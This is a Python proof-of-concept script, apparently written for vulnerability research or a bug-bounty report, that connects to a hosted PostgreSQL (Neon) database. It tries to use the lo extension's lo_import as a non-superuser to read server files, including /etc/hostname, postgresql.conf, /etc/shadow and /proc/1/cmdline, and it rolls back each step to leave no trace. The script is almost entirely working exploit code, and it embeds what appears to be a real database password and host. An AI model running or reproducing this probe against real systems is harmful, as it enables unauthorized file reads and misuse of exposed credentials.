# -*- coding: utf-8 -*-
"""lo 扩展非 superuser 文件读探测(事务内,ROLLBACK 零残留)
lo_import 读服务器文件 -> 大对象(事务可回滚,无文件系统残留)
若成功 => 免提权任意文件读(独立根因,与 #3992341 的 cloud_admin 提权链无关)"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = False
cur = conn.cursor()

def step(tag, sql=None, fetch=True):
    if sql is None:
        sql = tag
    try:
        cur.execute('BEGIN')
    except Exception:
        pass
    try:
        cur.execute(sql)
        if fetch:
            try:
                r = 'OK: %s' % str(cur.fetchall())[:400]
            except Exception:
                r = 'OK(no rows)'
        else:
            r = 'OK'
        cur.execute('ROLLBACK')
        return r
    except Exception as e:
        try:
            cur.execute('ROLLBACK')
        except Exception:
            pass
        return 'ERR: %s' % str(e)[:250]

print('=== lo 文件读探测(每步独立事务,ROLLBACK 零残留) ===')
print('[0] CREATE EXTENSION lo:', step('CREATE EXTENSION lo'))

print('\n[1] 基线:pg_read_file 直连(非 superuser 预期 DENIED):')
print(step("SELECT pg_read_file('/etc/hostname')"))

print('\n[2] lo_import /etc/hostname(读文件->大对象):')
print(step("SELECT lo_import('/etc/hostname')"))

print('\n[2b] 同事务内 lo_import + lo_get 读回内容:')
try:
    cur.execute('BEGIN')
    cur.execute("SELECT lo_import('/etc/hostname')")
    row = cur.fetchone()
    if row and row[0]:
        loid = row[0]
        cur.execute('SELECT convert_from(lo_get(%s), %s)', (loid, 'UTF8'))
        print('loid=%s content=%s' % (loid, cur.fetchone()))
    else:
        print('no loid')
    cur.execute('ROLLBACK')
except Exception as e:
    try:
        cur.execute('ROLLBACK')
    except Exception:
        pass
    print('ERR: %s' % str(e)[:250])

print('\n[3] lo_import $PGDATA/postgresql.conf:')
cur.execute("SELECT current_setting('data_directory')")
pgdata = cur.fetchone()[0]
print('PGDATA =', pgdata)
try:
    cur.execute('BEGIN')
    cur.execute('SELECT lo_import(%s)', (pgdata + '/postgresql.conf',))
    row = cur.fetchone()
    if row and row[0]:
        cur.execute('SELECT left(convert_from(lo_get(%s), %s), 200)', (row[0], 'UTF8'))
        print('content head:', cur.fetchone())
    cur.execute('ROLLBACK')
except Exception as e:
    try:
        cur.execute('ROLLBACK')
    except Exception:
        pass
    print('ERR: %s' % str(e)[:250])

print('\n[4] 边界:lo_import /etc/shadow(root-only,OS 权限边界):')
print(step("SELECT lo_import('/etc/shadow')"))

print('\n[5] 边界:lo_import /proc/1/cmdline:')
print(step("SELECT lo_import('/proc/1/cmdline')"))

print('\n[6] 边界:lo_import 不存在文件:')
print(step("SELECT lo_import('/no/such/file_xyz')"))

print('\n[7] 终验:无大对象残留')
cur.execute("SELECT count(*) FROM pg_largeobject_metadata")
print('大对象数:', cur.fetchone())
cur.execute("SELECT extname FROM pg_extension WHERE extname='lo'")
print('lo 扩展残留:', cur.fetchall())
conn.close()
